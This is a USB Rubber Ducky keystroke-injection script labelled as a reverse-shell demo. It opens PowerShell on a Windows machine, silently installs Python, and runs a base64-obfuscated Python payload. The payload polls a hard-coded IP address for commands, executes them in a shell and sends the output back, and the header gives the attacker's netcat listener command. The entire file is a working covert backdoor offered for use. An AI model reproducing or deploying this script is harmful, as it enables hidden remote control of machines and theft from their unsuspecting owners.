REM #################################################
REM # rubber ducky macro reverse shell -- demo
REM # server command: sudo nc -lvnp 8888
REM #################################################

REM wait for USB
DELAY 1500

REM start menu command: Win+R
GUI r
DELAY 1500

REM open powershell prompt
STRING powershell
DELAY 1500
ENTER
DELAY 1500

REM install python3
STRING winget install Python3 --silent --accept-source-agreements
DELAY 1500
ENTER

REM install requests via pip3
STRING pip3 install requests -q
DELAY 1500
ENTER

REM python payload (my VPS:80)
STRING python -c "import base64; exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKCnNlcnZlcl91cmwgPSAiaHR0cDovLzg5LjI1MC42OS44ODo4MCIKY2hlY2tfaW50ZXJ2YWwgPSA1CgpkZWYgZXhlY3V0ZV9jb21tYW5kKGNvbW1hbmQpOgogICAgIiIiIGNvbW1hbmQgZXhlY3V0aW9uICIiIgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGNvbW1hbmQsIHNoZWxsPVRydWUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICByZXR1cm4gcmVzdWx0LmRlY29kZSgndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToKICAgICAgICByZXR1cm4gc3RyKGUpCgpkZWYgbWFpbigpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgICMgZ2V0IGNvbW1hbmQgZnJvbSBzZXJ2ZXIKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoZiJ7c2VydmVyX3VybH0vY29tbWFuZCIsIHRpbWVvdXQ9MTApCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIGNvbW1hbmQgPSByZXNwb25zZS50ZXh0LnN0cmlwKCkKICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQubG93ZXIoKSA9PSAiZXhpdCI6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsgICMgY2xvc2Ugc2hlbGwKICAgICAgICAgICAgICAgIG91dHB1dCA9IGV4ZWN1dGVfY29tbWFuZChjb21tYW5kKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIHNlbmQgb3V0cHV0CiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYie3NlcnZlcl91cmx9L3Jlc3VsdCIsIGRhdGE9eyJvdXRwdXQiOiBvdXRwdXR9KQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzICAjIGVycm9yIGlnbm9yZQogICAgICAgIHRpbWUuc2xlZXAoY2hlY2tfaW50ZXJ2YWwpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp'))"
DELAY 1500
ENTER
